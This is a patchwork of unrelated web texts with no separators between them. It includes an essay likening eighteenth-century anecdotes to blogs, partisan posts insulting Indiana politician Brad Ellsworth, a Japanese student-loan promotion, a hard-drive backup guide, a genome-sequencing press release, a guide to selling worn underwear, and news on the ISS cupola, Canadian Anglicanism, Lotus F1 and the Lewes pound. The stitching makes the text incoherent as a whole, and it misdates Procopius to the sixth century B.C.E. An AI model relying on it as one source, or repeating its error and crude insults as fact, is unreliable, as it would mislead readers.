To appreciate the importance of a pre-modern blog , consult a database such as Eighteenth Century Collections Online and download a newspaper from eighteenth - century London .
It will have no headlines , no bylines , no clear distinction between news and ads , and no spatial articulation in the dense columns of type , aside from one crucial ingredient : the paragraph .
Paragraphs were self - sufficient units of news .
They had no connection with one another , because writers and readers had no concept of a news “ story ” as a narrative that would run for more than a few dozen words .
News came in bite - sized bits , often “ advices ” of a sober nature — the arrival of a ship , the birth of an heir to a noble title — until the 1770s , when they became juicy .
Pre-modern scandal sheets appeared , exploiting the recent discovery about the magnetic pull of news toward names .
As editors of the Morning Post and the Morning Herald , two men of the cloth , the Reverend Henry Bate ( known as “ the Reverend Bruiser ” ) and the Reverend William Jackson ( known as “ Dr. Viper ” ) packed their paragraphs with gossip about the great , and this new kind of news sold like hotcakes .
Much of it came from a bountiful source : the coffee house .
London coffee houses were nerve centers , where regulars picked up talk about the private lives of public figures .
Some regulars reduced the talk to writing , always in the form of a paragraph , and turned their bulletins in to editors or editor - compositors who set them in type and aligned the typeset paragraphs in columns on the imposing stone , ready for printing as the “ freshest advices . ”
Known as “ paragraph men , ” these early - modern reporters might get paid by the piece or they might supply copy in order to score points in the daily struggle to master public opinion .
Some did it for their own pleasure — like many bloggers today .
The French café functioned in the same manner , but the French press was censored , and French - language journals printed outside France took great care to avoid offending French authorities .
Gossipy news therefore circulated “ under the cloak ” in the form of short notes scribbled on scraps of paper that were carried around in pockets and passed from hand to hand .
( Some of them still exist in the archives of the Bastille , because they were confiscated when the police frisked prisoners . )
Although these bulletins usually contained only a few sentences , they were not called paragraphs .
They were known as “ anecdotes . ”
Two to three hundred years ago , the term anecdote meant nearly the opposite of what it means today .
Instead of representing a trivial incident or unreliable hearsay , as in the expression “ anecdotal evidence , ” it conveyed the notion of “ secret history ” — episodes concerning the private lives of important personages that had actually taken place but could not be published openly .
According to contemporary dictionaries and Diderot ’s Encyclopédie , the concept derived from Procopius , the Byzantine historian of the sixth century B.C.E. , who wrote scandalous secret histories about the private lives of Justinian , Theodora , and Belisarius to accompany the politically correct narratives of his formal histories .
Procopius — no connection with the famous Parisian Café Procope — was recognized as the remote ancestor of another variety of early - modern blogger , the “ nouvelliste . ”
Gossip mongers who worked oral circuits of communication were known as “ nouvellistes de bouche . ”
When they reduced news to written anecdotes and strung the anecdotes together in manuscript “ gazetins ” , they graduated into the ranks of “ nouvellistes à la main . ”
Here are some examples collected by the pamphleteer Pierre Manuel :
The prince de Conti was knocked out of commission by a girl known as the Little F ….. He blames it on Guerin , his medical advisor .
The duc de … surprised his wife in the arms of his son ’s tutor .
She said to him with an impudence worthy of a courtier , “ Why were n’t you there , Monsieur ?
When I do n’t have my esquire , I take the arm of my lackey . ”
These illegal newssheets proliferated everywhere in eighteenth - century France , owing to the demand for news , especially news of the saltiest variety .
The police tried to repress them , but for every “ nouvelliste ” locked up in the Bastille , a half - dozen more took up the pen .
Eventually , the police sought to gain control of this underground press by compiling their own manuscript gazettes — which eventually lost credence and were supplanted by still more “ nouvelles à la main . ”
Whether exchanged orally in a café , scribbled on a scrap of paper , or combined as paragraphs in a newssheet , anecdotes operated as the primary unit in a system of communication .
Many of them found their way into print .
They were picked up by famous writers like Voltaire , but more often they appeared in anonymous tracts known as “ libelles . ”
The spiciest “ libelles ” — works such as Anecdotes sur Mme la comtesse du Barry and Vie privée de Louis XV — became bestsellers .
If you read them carefully , you find that they contain a great many passages that were lifted from one another or from common underground gazettes .
They were really collages pieced together from pre-existing material and whatever new items that were available — just like today ’s blogs , which serve up compilations of tidbits collected from around the web .
Instead of imagining this literature as a corpus of books written by distinct authors , you should think of it as a shifting repertory of anecdotes , which were endlessly rearranged as they passed from one form to another .
The anecdotes constituted the early - modern equivalent of a blogosphere , one laced with explosives ; for on the eve of the Revolution , French readers were consuming as much smut about the private lives of the great as they were reading treatises about the abuse of power .
In fact , the anecdotes and the political discourse reinforced each other .
I would therefore argue that the early - modern blog played an important part in the collapse of the Old Regime and in the politics of the French Revolution .
I must admit , however , that I am consigning this argument to a blog .
Anyone who wants to see it developed at an appropriate length and with supporting evidence will have to read it as a book : The Devil in the Holy Water , or the Art of Slander from Louis XIV to Napoleon .
I do n’t believe that history teaches lessons , at least not in a direct , easily applied manner , but it does raise questions .
Are blogs disrupting traditional politics today just as “ libelles ” did in eighteenth - century France ?
From Ottawa , a piece on the Canadian government ’s International Development Agency ( CIDA ) cutting off NGO ’s for saying the wrong thing .
Aid groups say the federal government is casting a chill over advocacy work that takes positions on policy or political issues – and one claims a senior Conservative aide warned them against such activities ….
Another aid NGO , the left - leaning Montreal - based Alternatives , ca n’t get CIDA to return its calls since the National Post – citing unnamed government sources – reported that the organization ’s long - standing $ 2.1 - million funding proposal would be rejected because of its political advocacy .
Its most recent aid funding ran out last March .
Alternatives produces a newspaper that has published left - wing commentators and , for example , a piece that made a controversial argument for a “ united Israel ” and against Israel ’s status as a Jewish state – rather than the internationally endorsed “ two - state solution ” of Israel existing beside a separate Palestinian state .
“ Everything we hear is that Alternatives ’ advocacy work is the main reason we ’ll eventually be cut , ” said the organization ’s executive director , Michel Lambert .
The Human Rights Campaign ( HRC ) , the nation 's largest LGBT political organization , ranks Ellsworth as one of the ten worst Democratic Congress members when it comes to LGBT issues ; he scored a meager 30 out of 100 possible points .
... Ellsworth 's schizophrenic voting record on LGBT issues indicates that he is not a reliable friend to the LGBT community .
In 2007 , he voted against a Republican attempt to kill hate crimes legislation , but then voted against the hate crimes bill when it came to the floor ...
When I questioned Ellsworth about it later that year , his candid response took me by surprise .
He admitted that he voted against the bill because he knew there were already enough votes to pass it and anything seen as pro-gay would be unpopular to a large part of his conservative and rural district .
At the same time , Rep Ellsworth confirmed to me and the crowd gathered around that he would vote in favor of ENDA , the Employment Non-Discrimination Act , which would outlaw workplace discrimination against LGBT people .
Ellsworth cited his record as Vanderburgh County sheriff , where he implemented a non-discrimination policy that included sexual orientation .
While he did eventually end up voting in favor of a version of ENDA that stripped out transgender people , he also voted in favor of a Republican - led attempt to kill the legislation before the final vote by sending it back to committee for further study .
Ellsworth has n't co-sponsored the trans - inclusive version of ENDA currently sitting in committee and is one of only a few House Democrats not to publicly support the measure .
A member of the House Armed Services Committee , Ellsworth has also refused to state his position on repealing " Do n't Ask , Don't Tell . "
The Representative is n't co-sponsoring any other LGBT - positive legislation nor has he put out any statements indicating he would support any of the current pro-LGBT legislation awaiting action in the House .

" After many conversations with Hoosiers this week , and with the love and support of my family , I have decided to run for the U.S. Senate .
" The best years of my life are the more than two decades I spent in the local Sheriff ’s department .
Sheriff is a job that comes down to protecting families from harm , helping folks solve their problems or resolve their disputes , and just being willing to put your fellow citizens ' best interests ahead of your own .
When I look at the U.S. Senate these days , I sure think they could use more folks with those same qualities .
And that 's something I hope I could bring to the U.S. Senate – an independent voice to help Indiana through these tough economic times , and get things done for everyday folks who are really struggling . "
There 's good news and there 's bad news coming out of Indiana : Blue Dog shithead Brad Ellsworth is running for the Senate seat being vacated by ConservaDem Evan Bayh .
No one would ever know Bayh left if Ellsworth gets the seat , although Ellsworth may be slightly more right - of - center and , primarily because he 's newer to Beltway politics , not nearly as steeped in the kind of ungodly corporate corruption that defines Evan Bayh .
Many think Bayh 's announcement was timed to allow the Democratic Party to pick Ellsworth without a primary and to leave the Republicans with a gaggle of weak and ridiculous candidates ( with no ability for any of theirand ridiculous candidates , namely Mike Pence and Mitch Daniels , to get in on the action ) .
Ellsworth , handpicked and nurtured by Rahm Emanuel , was first elected in 2006 , in a landslide victory over longtime incumbent , the certifiably insane John Hostettler , not just one of Congress ' worst extremists but widely considered to be so obsessed with homosexuality that his mind has been warped beyond repair .
Ironically , he 's a candidate -- albeit a minor one -- in the GOP primary for the Senate seat as well .
IN - 09 , all of western Indiana save the heavily Democratic northern , industrial part of the state , is very Republican .
The PVI is R +9 .
In 2004 Bush beat Kerry with 62 % of the vote and 4 years later when Obama was winning statewide , IN - 09 , which includes Evansville , Vincennes , Greencastle and Terre Haute , only gave him 47 % of the vote , while re-electing the unabashedly conservative Ellsworth with 65 % .
Ellsworth , in fact , is about as socially conservative as Hostettler !
And he has one of the most unabashedly homophobic voting records of any Democrat anywhere .
Hostettler rested his whole career , other than opposing aid to Katrina - stricken New Orleans , on religionist buffoonery and homophobia -- sponsoring a bill passed by the House to repeal a D.C. law that allowed city workers to register domestic partners for health benefits , sponsoring a bill to permit churches to engage in political campaigns without losing their tax exempt status , sponsoring the so - called " Marriage Protection Act " to prevent federal courts from ruling on same - sex marriage licenses , etc. Could Ellsworth really be as bad ?
Yesterday at Huff Po Indiana Democrat and gay activist Bil Browning went into Ellsworth 's disgraceful record .
Obviously this race is n't going to rest on which candidate is more homophobic , especially since they are both very anti-gay .
But on the tough , substantive votes when he was most needed by Democrats , Ellsworth has been a dependable vote -- for John Boehner .
The GOPwill try to paint him as a rubber stamp but he 's only been with the Dems 35.82 % of the time on these tough votes in the 111th Congress , just slightly better than fellow reactionary Blue Dogs Baron Hill ( 33.33 % ) and Joe Donnelly ( 26.87 ) .
All three , for example , voted for the anti-Choice Stupak Amendment , which may make it difficult for Ellsworth to muster much enthusiasm from women or progressives .
Last year he also joined the Republicans to vote against the Helping Families Save Their Homes
Act and lots of other populist legislation that would play well in Indiana this year .
It looks like , for progressives , this will just be about having to decide whether or not to vote for someone with a " D " to prevent someone with an " F " getting into office .
It sure did n't work in Virginia or Massachusetts !

学生にとって、お金は社会人以上に大切な存在かもしれません。
もちろん、社会的責任も伴ってくる社会人においては、学生時代と比べ物にならないほどのお金が必要です。ですが、学生は基本的に仕事をすることが本分でもありません。
学業をメインとしているため、収入発生源はアルバイトに留まるのが基本でしょう。そのため、用途が小規模であったとしても、お金に窮してしまうケースは少なくありません。
にもかかわらず、お金が欠かせない瞬間というのも多々訪れます。
学費や資格取得費、さらには友達との交友費においても重要です。一生一度の学生時代は、社会に出ると共に終わってしまいます。そのため、友達との思い出作りもまた大切な作業のひとつとなってくるのです。
お金に困った学生にとって、工面するための便利な存在として、学生ローンが代表的でしょう。
「 学生」という文字が冠されていることからも分かる通り、学生に適したシステムのもと、融資を受けることが可能となります。少額規模であるものの、お金が欠かせない瞬間の多々訪れる学生にとって、最適な存在となるでしょう。
学生向けローンとなれば、やはり学業に使うお金の補助にしか融資は役立てられないのでしょうか。
学業に関係のない融資なら、一般的な消費者金融やローンでも問題ないわけです。
遊びや旅行といった交友にもちいることは、不可なのでしょうか。以下では、そんな学生ローンを学業以外にもちいるケースについて掘り下げています。特徴を把握した上で、うまく役立ててみてください。
For those of you who know me ( either online or offline ) , you will probably hear at one point or another how much I LOVE external hard drives .
Why I back up at all
Why not , really ?
It ’s like flossing .
You KNOW you should do it , and do it regularly , but sometimes you slide .
In one of my favourite TV series “ Sex and the City ” , Carrie Bradshaw , one of the main characters of the show , did n’t back up her work regularly on her Macbook and lost ALL of her written articles saved on there .
I have also experienced the effects of NOT backing up .
I only got burned once when I was in high school and I lost some important documents or photos , and I vowed to never lose my data again .
This was before the age of external hard drives being affordable , so I burned everything to a CD .
Yes .
Everything burned to a CD .
When your work is backed up :
you are n’t living on the dangerous , digital edge
you will never face the IT department again in tears , mascara running down your face
you will never feel rage or anger when your computer dies in the middle of a project
you sleep better at night , knowing that if your computer conks out , you ’re okay
you will be a cool cucumber when your computer takes a dive into the river
you are not going to lose those precious photos or home videos
you are not going to lose your scanned , never - to - be - replaced - again documents
Billions of reasons , really . 🙂
Why I back up everything at least twice
I should note that when you move a file or document from your computer and “ back it up ” on a hard drive , you are n’t really backing it up .
You only have ONE copy of the file in question , when you move it from your computer to your external hard drive .
You would need to move 2 copies of the file into two separate hard drives to move it off your computer , or else it ’s technically NOT a back up .
With that being said , having two backups means that just in case the one copy corrupts ( happened more than once to me with video and Excel files ) , you have another clean copy that you can use instead .
Thrice is preferred , but that means I ’d have to buy another 3 or 4 hard drives .
Why I do n’t use syncing software
I am not someone who enjoys using a lot of programs for something that I feel does n’t deliver an adequate return on my time spent using it .
If I can be organized on my own with folders and good system , without extra software bebopping around , I ’m much happier .
I will also be the first to admit that I find syncing software a bit confusing .
I think you have to map each computer folder to your hard drive folder .
It ’s only a bit of work at the start , but I really like the flexibility of being able to move folders , rename them , delete them without having to worry about re-mapping folders again .
What brands I ’d recommend :
Western Digital , Seagate , Iomega and Verbatim for the USB keys .
Those brands have never lost data for me , and always work beautifully .
My father says that LaCie works great for him , but the rest of us ( excluding my mother who does n’t even know what an external hard drive is ) are in the Western Digital camp .
How to buy a hard drive :
Always buy the biggest size you can afford ( The 2TB is the biggest size you can get )
Always buy a USB - powered hard drive ( The 1TB size just came out in Passport form )
Never cheap out on a hard drive ( I bought 2 cheap hard drives once .
NEVER AGAIN . )
Remember when you are handing over your credit card , that your data is irreplaceable
You can buy a 500 GB hard drive for about $ 130 now .
It ’s quite decent , and 500GB is more than enough space for most folks .
THE USES OF EACH HARD DRIVE
Here ’s a quick visual of what I use on a regular to a semi-regular basis :
Not pictured :
My first external hard drive , bought 6 years ago still going strong – 60 GB
2 USB work keys – 8 GB secured to backup projects and 4GB open to pass around
Backing up the Macbook
I USE : A 120 GB Seagate External Hard drive
Note : I do n’t back up my PC because of my double - backup strategy described below .
And I also have n’t found a good software that will properly , and reliably make Carbon Copy Clones of my hard drive the way the AWESOME Carbon Copy Cloner program for the Mac has .
When I have a snafu on my Macbook , I just restore it back to the week or the time when I had last backed it up as being “ perfect and current ” .
NO ISSUES AT ALL .
I love it .
Unsecured Documents
I USE : A Western Digital Hard drive ( 160GB ) and a Comstar ( 120GB )
Note : I highly recommend Western Digital hard drives .
I have never had one die on me…yet .
This includes photographs , backing up the blogs , recipes , sheet music and personal documents .
All the things that I do n’t mind if an average person gets a hold of the data .
Secured Documents
I USE : A Verbatim USB Key ( 16GB ) and a Sandisk USB Key ( 16GB )
Note : I highly recommend Verbatim ’s USB keys .
Their password protection software trumps Sandisk’s
I keep this on a USB key with a password protection on it .
It ’s all my scanned bills , my taxes , my receipts , and anything I do n’t want an average person to be able to look at .
Storing Videos in the Interim
I USE : 2 Western Digital Hard Drives ( 500GB ) and ( 320 GB )
I watch a lot of videos .
A LOT .
But I hate dragging out my huge 1 TB ’s to grab videos or music off it , so I just keep a current copy of what I ’m into on these hard drives .
It ’s also great as a travel hard drive to keep me busy and entertained .
Storing Videos in the Long - Term
I USE : 2 Western Digital Notebook Hard Drives ( 1TB ) each
Note : I highly recommend sticking to USB - Powered hard drives .
I hate using these , because they require an external power plug .
It ’s great for people who have offices or desks where these hard drives will never move , but I work on the kitchen table most of the time .
I archive all of my videos and music on here to copy over to my other hard drives when I feel like watching a season of something .
I know they ’ve just released the 1TB Western Digital Hard drives in a handy passport form , powered by USB .
I am holding off on buying them because there ’s no real need at the moment , as these are working fine for now .
A bit cumbersome to use daily , but fine .
If the price drops to something more reasonable , I ’ll consider picking up 2 USB - powered drives to replace these .
HOW I USE THESE HARD DRIVES
The Camera Folder
When I have a new photo downloaded from my camera ’s SD card for example , I first unload it from the card into a folder called “ Camera ” .
I do this because when you edit photos directly on the SD card , if you make a mistake and delete a photo by accident , you cannot retrieve it from the Recycling Bin .
It ’s gone for good .
So I like to unload the images into a Camera folder , and sort and edit through them , just in case I make a mistake .
After I ’ve edited the photos and I want to actually transfer them out , I organize them into folders and put them in another folder named “ Transfer ” .
The Transfer Folder
This Transfer folder holds everything temporarily that has NOT been backed up on my hard drives .
I put new photos here , documents I ’ve created and want to save , backups … etc .
Nothing is permanently removed from this folder unless I have backed it up twice on two separate , external hard drives .
Why this system works for me :
Any file I access on a daily basis stays on my computer , but they ’re few and far between
No unnecessary files are stored permanently on my main computer
Frees up a lot of hard drive space so my computer is quicker
If I want to access my files quickly , I just plug in one of my hard drives to grab them
It ’s a forced procedure to ensure that I back up everything twice
It has taken me about 2 years to come to a comfortable procedure that :
Is n’t too finicky that I am confused about what hard drive is for what
Forces me to back up twice at all times
Keeps my main computer clean and organized
Gives me a reason to buy hard drives in the name of backing up data
Dr. Fidler is excited to welcome , Dr. Gregory Wang to Fidler On The Tooth .
Dr. Wang has joined forces with Dr. Fidler to help provide you with the high - quality care you deserve .
You can continue to expect the same compassionate dental care as before .
Now , you will have even more convenience with two Seattle dentists who want to help you .
You can read about him on our blog page .
Here are a few facts about Dr. Wang :
Human genomes from Southern African Bushmen and Bantu individuals have been sequenced by a team of scientists seeking a greater understanding of human genetic variation and its effect on human health .
The study 's findings will be published in the journal Nature on 18 February 2010 .
The research was completed by scientists from American , African , and Australian research institutions , with support from Penn State University in the United States and from several U.S. companies that market DNA - sequencing instruments .
" We sequenced the personal genomes of four Bushmen participants who are tribal leaders from their communities and are at least 80 years of age , and from one Bantu participant who is in his late 70s , " said Stephan Schuster , a professor at Penn State and a co-leader of the project .
The Nature paper reveals the identities of each of these five participants .
The other co-leader , Vanessa Hayes of the University of New South Wales , who also is a group leader at Children 's Cancer Institute Australia , added , " The Bantu participant is Right Reverend Archbishop Desmond Tutu who , through his Tswana and Nguni ancestry , is an ideal representative for most Southern Africans . "
The study identified 1.3 - million genetic variants that scientists previously had not observed .
These genetic variations reveal that Southern Africans are quite distinct genetically from Europeans , Asians , and West Africans .
The study also reveals striking levels of genetic differences among the individual study participants .
Webb Miller , professor of biology and computer science at Penn State , who performed the comparative analysis of the genomes , underscores the genetic uniqueness of the Bushmen by saying , " On average , there are more genetic differences between any two Bushmen in our study than between a European and an Asian .
To know how genes affect health , we need to see the full range of human genetic variation , and Southern Africa is the place to look . "
This study used three new sequencing technologies , which deliver DNA sequences with unprecedented economy and speed .
Tim Harkins , who led the study 's industry partners , said , " This project provides a unique opportunity to compare the strengths of current sequencing technologies , and it demonstrates that their combination results in data that is more accurate than from projects using only one of these methods . "
As sequencing technologies evolve , the number of genomic studies is growing exponentially .
" Human genomics is becoming a realistic and powerful medical resource that will gain momentum in 2010 , " Schuster said .
A nearly life - long medical history accompanies each of the study 's five personal genomes , facilitating the identification of genetic differences that may have contributed to particular health conditions .
The researchers expect that these genomes will enable more accurate identification of diseases caused by rare genetic variants in Southern Africans and also in the global human population .
To date , a genome - wide approach to identifying genetic disease susceptibility has disproportionally benefited the Western World in comparison to the African continent but " As a result of this project , " Hayes said , " Southern Africans will immediately be included in genome - wide disease association studies , increasing our ability to examine regionally significant diseases . "
Because the research team has made the the five genomes sequenced in its study freely available , the scientists expect that Southern Africans will be better represented in future studies of how genetic variation influences the effectiveness of drugs -- a research field known as pharmocogenomics , which relies on human genome sequences and is considered by many to be the future of drug design .
" To make our results easier to use than earlier genome sequences , we have established freely available Internet servers at Penn State , " Miller said .
Inclusion in pharmocogenomic studies is expected to benefit Southern Africans , who often have been poorly represented in pharmaceutical trails and who suffer from population - based differences in the effectiveness of drugs , such as anti-viral treatments for HIV / AIDS .
The new data also is expected to help Southern African scientist and Southern African entrepreneurs to develop appropriate treatments when world - wide approaches fail locally .
The Bushmen that participated in this study are the first people whose genomes have been sequenced that still practice a hunter / gatherer lifestyle , enabling scientists to correlate the unique physiology of Bushmen with the genetic variants detected in this study .
" The availability of Bushman and Southern African Bantu genomes permits researchers to examine one of the few remaining instances in the world of coexisting foraging and farming groups , " said Schuster .
The study identified several genetic adaptations in the Bushmen that make them ill - suited to certain perils of an agricultural lifestyle , including high - fat diets and exposure to malaria .
The research , which involved 50 investigators , was led by Penn State University .
Other institutions participating in the study include the Children 's Cancer Institute Australia , the University of New South Wales , the University of Washington , the Human Genome Sequencing Center at Baylor College of Medicine , Harvard Medical School , the University of Limpopo in the Republic of South Africa , Cornell University , the Genome Center of Washington University in St. Louis , the Broad Institute , the Sperling Foundation , and the National Human Genome Research Institute , along with supporters in Namibia .
Industrial partners of the study include Roche Diagnostics Corporation and Applied Biosystems , with several additional U.S. companies having opted to join the ongoing project in the future .

Have you ever looked around your room and wondered what you could sell for some extra / much needed cash ?
Did you look in your small - laundry items drawer ?
Maybe you need to .
The used - bottom fashion trade is a flourishing industry where sellers can make up to $ 75 a pair , and routinely between $ 15 and $ 30 .
By sellers , I mean average women ( some very average ) who are selling their tush - covers to pay bills or even buy wedding gowns .
Do n’t ask me how I know this .
But if you ’re interested in earning a couple hundred bucks a month for doing something you ’re probably already doing for free , here ’s what to sell and where to sell it .
Who can sell their fundees ?
Women of all shapes , sizes and ages seem to be finding willing buyers .
Men also can sell their worn grape - smugglers , but they are much less in - demand ( although men in women ’s garden tarps is a niche market ) .
The average pair of knick - knacks goes for around $ 20 , and occasionally as high as $ 50 .
Star hanky - blank sellers ( veterans with lots of satisfied customers offering rave reviews , just like on eBay ) can earn up to $ 75 a pair .
Where do I sell it ?
As with any product , you want it to be seen .
However , due to the nature of the item , you ca n’t exactly create a Facebook fan page or Twitter account .
Many sites are out there to connect buyers and sellers .
Here are the most popular choices among first - time and veteran sellers .
Craigslist :
You can always try posting your ad in the personals section for free , but you run the risk of it being flagged , and very quickly .
In the adult section ( for a $ 5 fee ) , you can sell your skidmark containers without hassle .
The catch is , you have to filter through all the “ non- buyers ” and their suggestive email requests .
Ebanned.net :
This is a great mature person website dedicated only to selling the things you ca n’t on eBay .
You create a listing of what you want to sell , someone buys it and you ship it — simple as that .
There ’s no fuss of back and forth with the buyer .
The downside is , your listing runs alongside many others for the exact same thing .
To give you an idea , there currently are around 300 listings for used victoria ’s secrets .
Ebanned charges a listing fee of 40 cents , along with extra features like $ 1 for bold headlines , $ 3 for highlighted headlines , etc .
Pay the extra dollar for a highlighted background — it ’s always worth it .
Used ( roupa interior ) portal.com , AKA CulotteHog : Since eBay put the kibosh on selling unterwasche ( or not wasched , in this case ) , dozens of other similar websites have popped up , and these sites are a bustling hive of forums , tips , and hints .
If you want the most out of your selling experience , CulotteHog is your new best friend .
Posting is free , and there ’s an array of hosting options , like “ About Me ” pages , helpful info for first - timers in their “ Used Hanes University ” section , interviews with pros and most importantly , a free seller directory .
Sometimes the level of involvement is a bit much when all you want is to wear the diddle bits and get paid , without getting to know your buyer and his plans for your product .
Can I sell my granny ’s prized heirlom private wardrobe items ?
You can , but cash - cows have bows , ribbons , zippers and buttons .
And less is more when it comes to fabric .
By less , I mean whale tails , which usually bring in $ 25 -$ 40 .
Lacy boycuts come in at a close second at around $ 15 - $ 25 and string Spongebob ’s hometowns take third with average earnings of $ 7 - $ 15 .
Stock up at Marshall ’s or JCPenny , which tend to have clearance bins where cute ondergoeds can run $ 2 a pair .
Typically , trunks for yo junk are advertised as having been worn for one to three days .
Buyers will sometimes request longer or more “ specialized ” wears .
This gets as cringe - worthy you can imagine .
It all boils down to your own level of comfort :
If you do n’t want to do something , someone else out there will .
So stick only with what you ’re okay with .
Wait , I have to post pictures ?
Yep .
Just like with selling things on Ebay , Etsy , or Craiglist , you have to show the merch .
Stay away from blurry , phone camera pictures .
The customers want to see the product in clear view .
Beginners do n’t usually show their faces — the important part of the picture is you in the valuable asset up for sale .
It helps to have a few drinks first , then set up that self - timer and get to work .
Be mindful of the background .
Kids ’ toys — or an actual kid — might be a turnoff .
The most important in this step — to keep yourself from backing out of it , that is — is to think of the money you ’ll make for doing zero extra work , save going to the post office .
What you DO NOT want to do here is think of the men you ’ll be sending your wedgie - makers to , or all the things they might do with your pan … .
NO , stay away from that .
Just take a sobering look at your bank account / credit card bill / student loan and commit .
What happens next ?
You ’ll need to set up an account with Alertpay so you can get paid .
Yes , there are many other online account options , but AlertPay is the only one that officially allows the transaction of happy thoughts and hugs for your perfectly legal grownup thundergarments .
If Paypal finds out that $ 35 transfer was for your ladywear , they ’ll fine you up to $ 500 .
After all that set - up , do n’t get discouraged if you do n’t get 18 bidders in the first 10 minutes .
If it does n’t sell , list it again .
Like any small business starting out , it takes some time to make a name for yourself , but then you do and the money starts rolling in .
You also could sell your first pair right away , and in two days have $ 30 you did n’t have before .
You just never know until you try .
A good seller writes her buyers thank - you emails .
You want to turn those first - timers into repeat buyers .
They can and will become a steady source of income .
Can I sell my socks too ?
Yep , along with melon slings , L’Eggs , adult , uh , dye pers , etc .
If you can think of it , there ’s probably already a niche market out there .

Astronauts install space station observation deck
With a diameter of about 2 metres and height of 1.5 metres , the European - built Cupola provides a shirtsleeve working environment for two crewmembers .
The ergonomically designed interior is equipped with workstations from which astronauts will be able to control the Station 's robotic arm .
by Staff Writers
Cape Canaveral , Florida ( AFP ) Feb 12 , 2010
Two NASA astronauts completed the first spacewalk Friday of a mission to install a seven - windowed observation dome aboard the International Space Station .
A giant robot arm hoisted the massive Tranquility node and the cupola , which will provide spectacular panoramic views of Earth and help crew members monitor space walks and docking operations , from the shuttle Endeavour 's payload bay onto the ISS .
The two spacewalkers then completed the first phase of work attaching the 2,600 - cubic - foot ( 74 - cubic - meter ) addition to the orbiting space station , which was built for NASA by the European group Thales Alenia Space in their Turin factory .
US astronaut Bob Behnken and his British - born partner Nicholas Patrick completed the first spacewalk of the mission , a six - hour , 32 - minute outer space task at 3:49 am ( 0849 GMT ) .
" The spacewalking pair finished all their assigned work and some get - ahead tasks , " the US space agency said in a statement .
Behnken , the lead spacewalker for the mission , undertook his fourth spacewalk , while Patrick headed out for the first time .
The cupola can accommodate two crew members at a time and is equipped with portable workstations that can control station and robotic activities .
Six windows are arrayed along its sides and another on top , all protected against the impact of tiny meteorites .
Once the new room is in place , the space station will be 90 percent complete .
The mission , one of five scheduled for NASA 's three shuttles before the program ends later this year after a 29 - year run , comes as the US space agency reevaluates its future after President Barack Obama effectively abandoned its plan to send astronauts back to the moon by 2020 .
Constrained by soaring deficits , Obama submitted a budget to Congress that encourages NASA to focus instead on developing commercial transport alternatives to ferry astronauts to the ISS after the shuttle program ends .
The ISS , a joint project involving 16 countries , has cost around 100 billion dollars , mostly funded by the United States .
Under Obama 's new budget , the orbiting research station could see its life extended by five years until 2020 .
Olympics fans heading to Vancouver might want to visit a vanishing cultural treasure while they 're in Canada -- local churches .
Canada has become a " post - Christian society " where once - dominant Anglicanism has " moved to the margins of public life , " according to a bleak study reported by Michael Valpy at the Globe and Mail .
A new assessment of the state of the church in Canada looks at the Anglican Diocese of British Columbia and then across the country and concludes that ,
... at the present rate of decline -- a loss of 13,000 members per year -- only one Anglican would be left in Canada by 2061 .
...
Nationally , between 1961 and 2001 , the church lost 53 per cent of its membership , declining to 642,000 from 1.36 million .
Between 1991 and 2001 alone , it declined by 20 per cent .
The report zeros in on Vancouver and the adjacent Gulf Islands , suggesting closing or preparing to shutter nearly two in three of its Anglican churches now that the Anglican population is
... one generation away from extinction ...
The unchurched are not coming to us .
Only the Roman Catholic Church is holding steady and the report attributes that to immigration .
Religious studies professor David Seljak of St. Jerome 's University in Waterloo , Ont. , observes that " Canadians increasingly say they 're generically " Christian " rather than Anglican , Presbyterian or Pentecostal . "
Gee , where have we heard this before ?
Surveys in the USA are n't nearly so grim -- yet .
But , in the American Religious Identification Survey 's three studies over two decades , there 's clear evidence of a shift from denominational ties to generic Christian ties -- or out the church doors altogether .
The ARIS co-author Barry Kosmin said ,
More than ever before , people are just making up their own stories of who they are .
They say , " I 'm everything .
I 'm nothing .
I believe in myself . "
A pastor once told me that he wanted his church 's neighbors , even if they never entered the doors , to say , " We 're glad you 're here . "
When happens if -- or when -- they 're not ?
Would you miss your neighboring churches , even if you do n't attend ?

The first Lotus Formula 1 car for 15 years hit the race track on Tuesday as Fairuz Fauzy completed a secret shakedown for the team 's 2010 challenger at Silverstone .
As AUTOSPORT 's exclusive spy shot of the new car shows , the so - far unnamed machine was running in the historic green and yellow colours that were so synonymous with Lotus in the 1950s and 1960s .
It is not clear , however , whether the team will keep these colours for the season or they have just been used for the initial run .
The successful shakedown of the car marked an emotional moment for the Lotus team , which was only granted an entry for the 2010 season back in September .
Having undertaken the first engine fire - up of the car on Saturday , the team travelled to Silverstone to get some mileage on it before its official launch in London on Friday .
Team principal Tony Fernandes admitted that the first run with the new car had meant a lot to him .
" Shakedown started .
Quite a few tears , " he wrote on his official Twitter feed .
Lotus is scheduled to begin proper testing of the car at next week 's third pre-season F1 test at Jerez in Spain .
Lewes says it is not one in the eye for the chancellor , but a bid to boost local trade
The East Sussex town of Lewes has always been a contradictory sort of place , probably ever since the barons demanded a say in government and defeated Henry III outside the town in 1264 .
It was here too that Tom Paine honed his polemical skills at the Headstrong Club in the White Hart during the 1760s .
They still burn the Pope and sundry politicians in effigy every bonfire night .
And yesterday , just along the high street , the Brewer 's Arms was displaying a sign warning Alistair Darling that he was barred .
But today the town is going one step further along the road to contrariness by issuing its own pound notes , for the first time since the Lewes local bank - long subsumed into Barclays - stopped doing it in the 1890s .
It is not - as some media wishful thinkers have hoped - yet another slap in the face for the embattled chancellor to add to the humiliation of the Brewer 's Arms , but an attempt to boost local spending on the local economy .
Nearly 70 businesses in the town , from Harvey 's Brewery and Terry 's Fishmongers to Rik 's disks and Roger Murray , the acupuncturist , have signed up to accept Lewes pound banknotes , circulating at the same face value as pound coins , and to give them out in change to local shoppers .
The town is following where Totnes in Devon has already led .
The notes , of course , will not be legal tender anywhere else , though some will probably be kept by visiting tourists as souvenirs .
Initially 10,000 have been printed .
The scheme 's organisers have guaranteed local shopkeepers that they will not end up out of pocket because of their involvement .
The notes , a soothing green colour , illustrated with Tom Paine 's portrait on one side and Lewes Castle on the other , are printed on watermarked paper provided by a banknote company , with heat - sensitive fibres woven in and serial numbers on each .
They are unlikely to be run off cheaply on anyone 's photocopier , and any would - be thief would have to spend them locally or not at all .
Paine might have approved that the scheme was dreamed up by half a dozen local environmental activists , though it has gained the blessing of the town council , with Michael Chartier , the mayor , on hand to inaugurate the currency at a town hall meeting last night .
Oliver Dudok van Heel , a Dutch incomer to Lewes , who is one of the organisers , said : " We are not imposing anything on anyone and we have not waited for approval from any local authority or organisation .
We just thought , let 's give it a go .
We may not make an economic impact but we hope to raise awareness and start a conversation about how residents themselves can stimulate the local economy . "
